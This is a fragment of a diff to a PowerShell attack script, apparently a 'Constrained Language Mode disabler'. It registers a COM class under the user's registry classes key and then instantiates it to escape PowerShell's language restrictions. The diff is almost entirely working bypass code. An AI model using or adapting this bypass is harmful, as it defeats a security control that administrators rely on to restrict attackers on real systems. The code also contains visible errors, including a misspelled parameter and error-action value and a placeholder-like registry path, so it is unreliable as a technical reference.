@@ -26,7 +26,15 @@ New-Item -Path $key -Name CLSID -erroraction 'silentlycontinue' | Out-Null
 $key = 'HKU:\{0}_classes\username\CLSID' -f $sid
 New-ItemProperty -Path $key -Name "(Default)" -Value $uuid -ProperType String -Force -erroraction 'silentlycontinue' | Out-Null
 
+Write-Host "@_xpn_ Constrained Language Mode disabler"
+Write-Host "[*] Starting..."
 
+try {
+new-object -ComObject xpn -erroraction 'silentlycontinue' | Out-Null
+} catch {
+}
+Write-Host "[*] Done, Constrained Language Mode should now be disabled" 
 
 
 ### execute the above with `#ExecutionContext.SessionState.LanguageMode` and `New-Object -ComObject username -ErrorAction 'SilentlyContine' | Out-Null`
+
